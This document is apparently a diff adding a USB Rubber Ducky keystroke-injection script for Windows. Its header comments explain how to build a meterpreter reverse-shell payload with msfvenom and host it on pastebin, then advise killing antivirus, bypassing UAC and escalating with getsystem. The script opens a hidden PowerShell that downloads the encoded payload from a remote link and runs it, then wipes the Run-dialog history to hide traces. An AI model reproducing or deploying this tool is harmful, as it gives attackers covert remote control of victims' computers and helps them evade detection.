@@ -1,0 +1,30 @@
+REM Author: Finianb1 + @0xCoto
+Target: Windows 10, probably works on Windows 7
+REM Description: Makes a meterpreter reverse shell by downloading base64 from pastebin. Clears run menu history afterwards.
+
+REM Configuration:
+REM Generate payload using this command: msfvenom -p windows/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=YOUR_PORT -f psh-cmd --smallest Cut the payload down to JUST the base64. 
+REM Upload to pastebin, my example: https://pastebin.com/KQpwbiRS. 
+REM Then, simply convert this URL to a raw URL by adding a /raw/ in it (https://pastebin.com/raw/KQpwbiRS) or by clicking on the "raw" button and copying the link.
+REM Now you have your URL!
+REM You can URL shorten it if you'd like, just make sure you use the raw link and not the normal pastebin link.
+REM Now change the $u='YOUR_LINK' to your URL (e.g. $u='https://pastebin.com/raw/KQpwbiRS'). 
+REM Then simply upload it to your rubber ducky, and you can get extremely fast shells.
+
+REM NOTE: It is recommended you migrate the shell and kill antivirus as soon as possible, as most antiviruses will pick up on a meterpreter shell and kill it. 
+REM Running getsystem command on meterpreter is also great. 
+REM Use the windows/local/bypassuac modules (find them with the command search bypassuac, 
+REM I find that exploit/windows/local/bypassuac_injection_winsxs works very well for my Windows 10 device, disabled antivirus of course!) for Windows 8 and up.
+REM This will allow you to bypass the UAC on windows, any level, and be able to freely run the getsystem command, which essentially lets you do anything.
+
+REM Opens a meterpreter using a pastebin link
+REM See https://github.com/hak5/bashbunny-payloads/blob/master/payloads/library/remote_access/SingleSecondShell/readme.md
+REM For how to create a link to your personal shellcode
+DELAY 2000
+GUI r
+DELAY 1000
+STRING powershell -windowstyle hidden $u='YOUR_LINK';$r=Invoke-WebRequest -Uri $u;powershell -nop -e $r.content
+ENTER
+GUI r
+DELAY 1000
+STRING powershell -WindowStyle Hidden -Exec Bypass "Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue"
